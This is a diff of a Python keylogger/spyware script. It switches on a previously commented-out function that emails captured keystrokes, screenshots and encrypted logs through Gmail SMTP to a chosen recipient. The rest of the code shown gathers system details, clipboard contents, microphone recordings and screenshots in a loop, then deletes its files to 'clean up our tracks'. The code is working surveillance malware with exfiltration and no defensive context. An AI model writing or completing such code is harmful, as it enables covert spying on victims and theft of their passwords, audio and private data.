@@ -41,12 +41,12 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-# email_address = " " # Enter disposable email here
-# password = " " # Enter email password here
+email_address = " " # Enter disposable email here
+password = " " # Enter email password here
 
 username = getpass.getuser()
 
-# toaddr = " " # Enter the email address you want to send your information to
+toaddr = " " # Enter the email address you want to send your information to
 
 key = "hhzJoEVoIXARy37JJCHzitnM7shw-nD1f3pdtys_t44=" # Generate an encryption key from the Cryptography folder
 
@@ -55,50 +55,50 @@ extend = "\\"
 file_merge = file_path + extend
 
 # Email Controls
-# def send_email(filename, attachment, toaddr):
-#
-#     fromaddr = email_address
-#
-#     msg = MIMEMultipart()
-#
-#     msg['From'] = fromaddr
-#
-#     msg['To'] = toaddr
-#
-#     msg['Subject'] = "Log File"
-#
-#     body = "Body_of_the_mail"
-#
-#     msg.attach(MIMEText(body, 'plain'))
-#
-#     filename = filename
-#     attachment = open(attachment, 'rb')
-#
-#     p = MIMEBase('application', 'octet-stream')
-#
-#     p.set_payload((attachment).read())
-#
-#     encoders.encode_base64(p)
-#
-#     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-#
-#     msg.attach(p)
-#
-#     s = smtplib.SMTP('smtp.gmail.com', 587)
-#
-#     s.starttls()
-#
-#     s.login(fromaddr, password)
-#
-#     text = msg.as_string()
-#
-#     s.sendmail(fromaddr, toaddr, text)
-#
-#     s.quit()
-#
-# send_email(keys_information, file_path + extend + keys_information, toaddr)
+def send_email(filename, attachment, toaddr):
 
-# get the computer information
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+# Getting the Computer Information
 def computer_information():
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
@@ -118,7 +118,7 @@ def computer_information():
 
 computer_information()
 
-# get the clipboard contents
+# Getting The Clipboard Contents
 def copy_clipboard():
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
@@ -133,7 +133,7 @@ def copy_clipboard():
 
 copy_clipboard()
 
-# get the microphone
+# Getting the Microphone
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -143,7 +143,7 @@ def microphone():
 
     write(file_path + extend + audio_information, fs, myrecording)
 
-# get screenshots
+# Getting the Screenshots
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
@@ -155,7 +155,7 @@ number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
-# Timer for keylogger
+# Timer for Keylogger
 while number_of_iterations < number_of_iterations_end:
 
     count = 0
@@ -200,7 +200,7 @@ while number_of_iterations < number_of_iterations_end:
             f.write(" ")
 
         screenshot()
-        # send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
+        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
 
         copy_clipboard()
 
@@ -209,7 +209,7 @@ while number_of_iterations < number_of_iterations_end:
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
-# Encrypt files
+# Encrypt Files
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
 encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
 
@@ -226,12 +226,12 @@ for encrypting_file in files_to_encrypt:
     with open(encrypted_file_names[count], 'wb') as f:
         f.write(encrypted)
 
-    # send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
+    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
     count += 1
 
 time.sleep(120)
 
-# Clean up our tracks and delete files
+# Clean up our Tracks and Delete Files
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
